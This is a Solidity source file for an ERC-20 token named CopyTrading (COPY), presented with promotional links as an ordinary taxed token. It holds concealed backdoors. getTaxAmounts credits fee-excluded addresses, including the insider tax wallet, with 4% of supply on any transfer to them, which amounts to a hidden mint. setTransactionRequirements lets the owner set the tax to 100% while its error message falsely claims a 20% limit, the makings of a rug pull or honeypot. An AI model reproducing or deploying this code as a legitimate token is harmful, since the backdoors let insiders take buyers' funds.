// SPDX-License-Identifier: MIT

/*
Website: https://www.copytrading.cloud
Telegram: https://t.me/copy_eth
Twitter: https://twitter.com/copy_erc
*/

pragma solidity 0.8.19;

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function renounceOwnership() public onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address dexPair);
}

interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract CopyTrading is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "CopyTrading";
    string private constant _symbol = "COPY";

    uint8 private constant _decimals = 9;
    uint256 private _supplyTotal = 10 ** 9 * 10 ** _decimals;

    IDexRouter dexRouter;
    address public dexPair;

    bool private tradeBegin = false;
    bool private taxEnabled = true;
    bool private swapping;

    uint256 private numTaxSent;
    uint256 private taxSendAt;

    uint256 private taxThreshold = ( _supplyTotal * 1000 ) / 100000;
    uint256 private taxMinThreshold = ( _supplyTotal * 10 ) / 100000;
    
    uint256 private lpWeight = 0;
    uint256 private taxWeight = 0;
    uint256 private burnWeight = 0;
    uint256 private devWeight = 100;

    uint256 private tax = 1200;
    uint256 private denominator = 10000;

    modifier lockSwap {swapping = true; _; swapping = false;}

    address internal taxWallet = 0xD1Dd54640B8b6914Be18034a1E77c1F0eaEF5B42;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 private maxTransaction = ( _supplyTotal * 400 ) / 10000;
    uint256 private maxTransfer = ( _supplyTotal * 400 ) / 10000;
    uint256 private maxWallet = ( _supplyTotal * 400 ) / 10000;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromFee;

    constructor() Ownable(msg.sender) {
        IDexRouter _router = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IDexFactory(_router.factory()).createPair(address(this), _router.WETH());
        dexRouter = _router; dexPair = _pair;

        isExcludedFromFee[taxWallet] = true;
        isExcludedFromFee[msg.sender] = true;
        _balances[msg.sender] = _supplyTotal;
        emit Transfer(address(0), msg.sender, _supplyTotal);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function getOwner() external view override returns (address) { return owner; }
    function startTrading() external onlyOwner {tradeBegin = true;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _supplyTotal.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function getTaxAmounts(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExcludedFromFee[recipient]) {return maxTransaction;}
        if(tax > 0){
        uint256 feeAmount = amount.div(denominator).mul(tax);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnWeight > uint256(0) && tax > burnWeight){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnWeight));}
        return amount.sub(feeAmount);} return amount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }    

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            taxWallet,
            block.timestamp);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supplyTotal.mul(_buy).div(10000); uint256 newTransfer = _supplyTotal.mul(_sell).div(10000); uint256 newWallet = _supplyTotal.mul(_wallet).div(10000);
        maxTransaction = newTx; maxTransfer = newTransfer; maxWallet = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        lpWeight = _liquidity; taxWeight = _marketing; burnWeight = _burn; devWeight = _development; tax = _total; tax = _sell; tax = _trans;
        require(tax <= denominator.div(1) && tax <= denominator.div(1) && tax <= denominator.div(1), "buyTax and sellTax cannot be more than 20%");
    }

    function shouldSwapCA(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= taxMinThreshold;
        bool aboveThreshold = balanceOf(address(this)) >= taxThreshold;
        return !swapping && taxEnabled && tradeBegin && aboveMin && !isExcludedFromFee[sender] && recipient == dexPair && numTaxSent >= taxSendAt && aboveThreshold;
    }

    function swapBackTokensForFee(uint256 tokens) private lockSwap {
        uint256 _denominator = (lpWeight.add(1).add(taxWeight).add(devWeight)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(lpWeight).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(lpWeight));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(lpWeight);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(taxWeight);
        if(marketingAmt > 0){payable(taxWallet).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(taxWallet).transfer(contractBalance);}
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]){require(tradeBegin, "tradeBegin");}
        if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient] && recipient != address(dexPair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= maxWallet, "Exceeds maximum wallet amount.");}
        if(sender != dexPair){require(amount <= maxTransfer || isExcludedFromFee[sender] || isExcludedFromFee[recipient], "TX Limit Exceeded");}
        require(amount <= maxTransaction || isExcludedFromFee[sender] || isExcludedFromFee[recipient], "TX Limit Exceeded"); 
        if(recipient == dexPair && !isExcludedFromFee[sender]){numTaxSent += uint256(1);}
        if(shouldSwapCA(sender, recipient, amount)){swapBackTokensForFee(taxThreshold); numTaxSent = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = amount;
        if (!isExcludedFromFee[sender]) {amountReceived = getTaxAmounts(sender, recipient, amount);}
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
}